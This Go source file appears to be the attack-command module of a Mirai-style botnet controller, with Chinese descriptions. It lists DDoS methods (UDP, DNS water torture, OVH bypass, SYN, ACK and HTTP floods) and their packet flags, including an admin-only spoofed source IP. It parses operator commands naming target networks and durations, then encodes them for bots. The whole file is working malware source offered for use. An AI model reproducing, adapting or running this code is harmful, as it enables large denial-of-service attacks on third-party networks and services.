package main

import (
	"encoding/binary"
	"errors"
	"fmt"
	"net"
	"strconv"
	"strings"

	"github.com/mattn/go-shellwords"
)

type AttackInfo struct {
	attackID          uint8
	attackFlags       []uint8
	attackDescription string
}

type Attack struct {
	Duration uint32
	Type     uint8
	Targets  map[uint32]uint8 // Prefix/netmask
	Flags    map[uint8]string // key=value
}

type FlagInfo struct {
	flagID          uint8
	flagDescription string
}

var flagInfoLookup map[string]FlagInfo = map[string]FlagInfo{
	"len": FlagInfo{
		0,
		"包数据大小，默认512字节",
	},
	"rand": FlagInfo{
		1,
		"随机分组数据内容，默认为1 (yes)",
	},
	"tos": FlagInfo{
		2,
		"IP 头中的 TOS 字段值，默认为 0",
	},
	"ident": FlagInfo{
		3,
		"IP头中的ID字段值，默认为随机",
	},
	"ttl": FlagInfo{
		4,
		"IP头中的TTL字段，默认为 255",
	},
	"df": FlagInfo{
		5,
		"设置 IP 头中的 Dont-Fragment 位，默认为 0 (no)",
	},
	"sport": FlagInfo{
		6,
		"源端口，默认随机",
	},
	"dport": FlagInfo{
		7,
		"目的端口，默认随机",
	},
	"domain": FlagInfo{
		8,
		"要攻击的域名",
	},
	"dhid": FlagInfo{
		9,
		"域名交易ID，默认随机",
	},
	"urg": FlagInfo{
		11,
		"设置IP头中的URG位，默认为 0 (no)",
	},
	"ack": FlagInfo{
		12,
		"设置 IP 头中的 ACK 位，默认为 0（no），除了 ACK 泛洪",
	},
	"psh": FlagInfo{
		13,
		"设置 IP 头中的 PSH 位，默认为 0 (no)",
	},
	"rst": FlagInfo{
		14,
		"设置 IP 头中的 RST 位，默认为 0 (no)",
	},
	"syn": FlagInfo{
		15,
		"设置 IP 头中的 ACK 位，默认为 0（否），SYN 攻击除外",
	},
	"fin": FlagInfo{
		16,
		"设置IP头中的FIN位，默认为 0 (no)",
	},
	"seqnum": FlagInfo{
		17,
		"TCP头中的序列号值，默认是随机的",
	},
	"acknum": FlagInfo{
		18,
		"TCP头中的确认数字值，默认是随机的",
	},
	"gcip": FlagInfo{
		19,
		"将内部 IP 设置为目标 IP，默认为 0 (no)",
	},
	"method": FlagInfo{
		20,
		"HTTP 方法名，默认为 get",
	},
	"postdata": FlagInfo{
		21,
		"POST 数据，默认为空/无",
	},
	"path": FlagInfo{
		22,
		"HTTP 路径，默认为 /",
	},
	/*"ssl": FlagInfo {
	      23,
	      "使用 HTTPS/SSL"
	  },
	*/
	"conns": FlagInfo{
		24,
		"连接数",
	},
	"source": FlagInfo{
		25,
		"源IP地址，255.255.255.255为随机",
	},
}

var attackInfoLookup map[string]AttackInfo = map[string]AttackInfo{
	"plain": AttackInfo{
		0,
		[]uint8{0, 1, 7},
		"针对更高 PPS 优化的 UDP 攻击",
	},
	"udp": AttackInfo{
		1,
		[]uint8{2, 3, 4, 0, 1, 5, 6, 7, 25},
		"标准 UDP 攻击",
	},
	"dns": AttackInfo{
		2,
		[]uint8{2, 3, 4, 5, 6, 7, 8, 9},
		"DNS攻击折磨（UDP）",
	},
	"stdhex": AttackInfo{
		3,
		[]uint8{0, 1, 7},
		"STD 十六进制攻击 (UDP)",
	},
	"ovh": AttackInfo{
		4,
		[]uint8{0, 1, 7},
		"OVH 十六进制攻击 (UDP)",
	},
	"syn": AttackInfo{
		5,
		[]uint8{2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25},
		"TCP SYN 攻击",
	},
	"ack": AttackInfo{
		6,
		[]uint8{0, 1, 2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25},
		"tcp based ack 攻击",
	},
	"http": AttackInfo{
		7,
		[]uint8{8, 7, 20, 21, 22, 24},
		"Layer7 自定义攻击",
	},
}

func uint8InSlice(a uint8, list []uint8) bool {
	for _, b := range list {
		if b == a {
			return true
		}
	}
	return false
}

func NewAttack(str string, admin int) (*Attack, error) {
	atk := &Attack{0, 0, make(map[uint32]uint8), make(map[uint8]string)}
	args, _ := shellwords.Parse(str)

	var atkInfo AttackInfo
	// Parse attack name
	if len(args) == 0 {
		return nil, errors.New("必须指定攻击名称")
	} else {
		if args[0] == "?" {
			validCmdList := "\x1b[97m可用攻击列表:\r\n\033[31m"
			for cmdName, atkInfo := range attackInfoLookup {
				validCmdList += cmdName + ": " + atkInfo.attackDescription + "\r\n"
			}
			return nil, errors.New(validCmdList)
		}
		var exists bool
		atkInfo, exists = attackInfoLookup[args[0]]
		if !exists {
			return nil, errors.New(fmt.Sprintf("\x1b[97m%s \x1b[36m不是有效的命令.", args[0]))
		}
		atk.Type = atkInfo.attackID
		args = args[1:]
	}

	// Parse targets
	if len(args) == 0 {
		return nil, errors.New("必须指定前缀/网络掩码作为目标")
	} else {
		if args[0] == "?" {
			return nil, errors.New("\x1b[97m逗号分隔的目标前缀列表\r\nEx: 192.168.0.1\r\nEx: 10.0.0.0/8\r\nEx: 8.8.8.8,127.0.0.0/29")
		}
		cidrArgs := strings.Split(args[0], ",")
		if len(cidrArgs) > 255 {
			return nil, errors.New("一次攻击不能指定超过 255 个目标!")
		}
		for _, cidr := range cidrArgs {
			prefix := ""
			netmask := uint8(32)
			cidrInfo := strings.Split(cidr, "/")
			if len(cidrInfo) == 0 {
				return nil, errors.New("指定空白目标!")
			}
			prefix = cidrInfo[0]
			if len(cidrInfo) == 2 {
				netmaskTmp, err := strconv.Atoi(cidrInfo[1])
				if err != nil || netmask > 32 || netmask < 0 {
					return nil, errors.New(fmt.Sprintf("提供了无效的网络掩码，靠近 %s", cidr))
				}
				netmask = uint8(netmaskTmp)
			} else if len(cidrInfo) > 2 {
				return nil, errors.New(fmt.Sprintf("前缀中的 / 太多，靠近 %s", cidr))
			}

			ip := net.ParseIP(prefix)
			if ip == nil {
				return nil, errors.New(fmt.Sprintf("解析IP地址失败，靠近 %s", cidr))
			}
			atk.Targets[binary.BigEndian.Uint32(ip[12:])] = netmask
		}
		args = args[1:]
	}

	// Parse attack duration time
	if len(args) == 0 {
		return nil, errors.New("必须指定攻击持续时间")
	} else {
		if args[0] == "?" {
			return nil, errors.New("\x1b[97m攻击持续时间，以秒为单位")
		}
		duration, err := strconv.Atoi(args[0])
		if err != nil || duration == 0 || duration > 86400 {
			return nil, errors.New(fmt.Sprintf("无效的攻击持续时间，靠近 %s. 持续时间必须在 0 到 86400 秒之间", args[0]))
		}
		atk.Duration = uint32(duration)
		args = args[1:]
	}

	// Parse flags
	for len(args) > 0 {
		if args[0] == "?" {
			validFlags := "\x1b[97m由空格分隔的标志键=值列表。 此方法的有效标志是\r\n\r\n"
			for _, flagID := range atkInfo.attackFlags {
				for flagName, flagInfo := range flagInfoLookup {
					if flagID == flagInfo.flagID {
						validFlags += flagName + ": " + flagInfo.flagDescription + "\r\n"
						break
					}
				}
			}
			validFlags += "\r\n标志的值 65535 表示随机（对于端口等）\r\n"
			validFlags += "Ex: seq=0\r\nEx: sport=0 dport=65535"
			return nil, errors.New(validFlags)
		}
		flagSplit := strings.SplitN(args[0], "=", 2)
		if len(flagSplit) != 2 {
			return nil, errors.New(fmt.Sprintf("附近的无效键=值标志组合 %s", args[0]))
		}
		flagInfo, exists := flagInfoLookup[flagSplit[0]]
		if !exists || !uint8InSlice(flagInfo.flagID, atkInfo.attackFlags) || (admin == 0 && flagInfo.flagID == 25) {
			return nil, errors.New(fmt.Sprintf("无效的标志键 %s, 靠近 %s", flagSplit[0], args[0]))
		}
		if flagSplit[1][0] == '"' {
			flagSplit[1] = flagSplit[1][1 : len(flagSplit[1])-1]
			fmt.Println(flagSplit[1])
		}
		if flagSplit[1] == "true" {
			flagSplit[1] = "1"
		} else if flagSplit[1] == "false" {
			flagSplit[1] = "0"
		}
		atk.Flags[uint8(flagInfo.flagID)] = flagSplit[1]
		args = args[1:]
	}
	if len(atk.Flags) > 255 {
		return nil, errors.New("标志不能超过 255 个")
	}

	return atk, nil
}

func (this *Attack) Build() ([]byte, error) {
	buf := make([]byte, 0)
	var tmp []byte

	// Add in attack duration
	tmp = make([]byte, 4)
	binary.BigEndian.PutUint32(tmp, this.Duration)
	buf = append(buf, tmp...)

	// Add in attack type
	buf = append(buf, byte(this.Type))

	// Send number of targets
	buf = append(buf, byte(len(this.Targets)))

	// Send targets
	for prefix, netmask := range this.Targets {
		tmp = make([]byte, 5)
		binary.BigEndian.PutUint32(tmp, prefix)
		tmp[4] = byte(netmask)
		buf = append(buf, tmp...)
	}

	// Send number of flags
	buf = append(buf, byte(len(this.Flags)))

	// Send flags
	for key, val := range this.Flags {
		tmp = make([]byte, 2)
		tmp[0] = key
		strbuf := []byte(val)
		if len(strbuf) > 255 {
			return nil, errors.New("标志值不能超过 255 个字节!")
		}
		tmp[1] = uint8(len(strbuf))
		tmp = append(tmp, strbuf...)
		buf = append(buf, tmp...)
	}

	// Specify the total length
	if len(buf) > 4096 {
		return nil, errors.New("最大缓冲区为 4096")
	}
	tmp = make([]byte, 2)
	binary.BigEndian.PutUint16(tmp, uint16(len(buf)+2))
	buf = append(tmp, buf...)

	return buf, nil
}
